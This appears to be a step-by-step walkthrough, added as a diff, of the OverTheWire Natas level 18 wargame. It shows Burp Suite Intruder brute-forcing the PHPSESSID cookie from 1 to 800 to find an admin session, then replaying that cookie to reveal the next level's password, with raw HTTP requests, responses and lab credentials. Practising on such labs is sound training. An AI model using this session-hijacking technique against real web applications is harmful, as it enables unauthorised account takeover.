@@ -1,0 +1,126 @@
+PASSWORD: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+
+URL: http://natas18.natas.labs.overthewire.org/
+ Please login with your admin account to retrieve credentials for natas19.
+Username: admin
+Password: admin
+LOGIN
+
+URL: http://natas18.natas.labs.overthewire.org/index.php
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.
+
+*BURP SUITE*
+*TOGGLE Intercept on
+
+*WEB BROWSER*
+URL: http://natas18.natas.labs.overthewire.org/
+ Please login with your admin account to retrieve credentials for natas19.
+Username: admin
+Password: admin
+LOGIN
+
+*BURP SUITE*
+POST /index.php HTTP/1.1
+Host: natas18.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://natas18.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==
+Connection: close
+Referer: http://natas18.natas.labs.overthewire.org/
+Cookie: PHPSESSID=636  <-----SESSIONID
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin
+
+*SESSIONID IS 636*
+*SEND TO Intruder
+*TOGGLE Intercept off
+*TOGGLE Intruder
+*CLEAR$
+*HIGHLIGHT THE SESSIONID NUMBER 636 AND PRESS ADD$
+*TOGGLE PAYLOADS
+*PAYLOAD SET 1
+*PAYLOAD TYPE NUMBERS
+*NUMBER RANGE
+*TYPE SEQUENTIAL
+*FROM 1
+*TO 800
+*STEP 1
+*START ATTACK
+
+*PRESS THE LENGTH COLUMN TO FIND THE DIFFERENT VALUE*
+*LENGTH = 1362 FOR REQUEST NUMBER 119*
+*HIGHLIGHT REQUEST 119*
+*RESPONSE*
+HTTP/1.1 200 OK
+Date: Sun, 02 Jun 2024 08:00:42 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1024
+Keep-Alive: timeout=5, max=89
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas18", "pass": "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq" };</script></head>
+<body>
+<h1>natas18</h1>
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s  <-----PASSWORD
+</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+*TOGGLE PROXY
+*TOGGLE Intercept is on
+
+*WEB BROWSER*
+URL: http://natas18.natas.labs.overthewire.org/index.php
+*REFRESH*
+*RELOAD*
+
+*BURP SUITE*
+POST /index.php HTTP/1.1
+Host: natas18.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://natas18.natas.labs.overthewire.org/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://natas18.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==
+Connection: close
+Cookie: PHPSESSID=119  <-----CHANGE SESSIONID
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin
+
+*TOGGLE FORWARD/SEND*
+*TOGGLE Intercept is off
+
+*WEB BROWSER*
+URL: http://natas18.natas.labs.overthewire.org/index.php
+ You are an admin. The credentials for the next level are:
+
+Username: natas19
+Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s  <-----PASSWORD
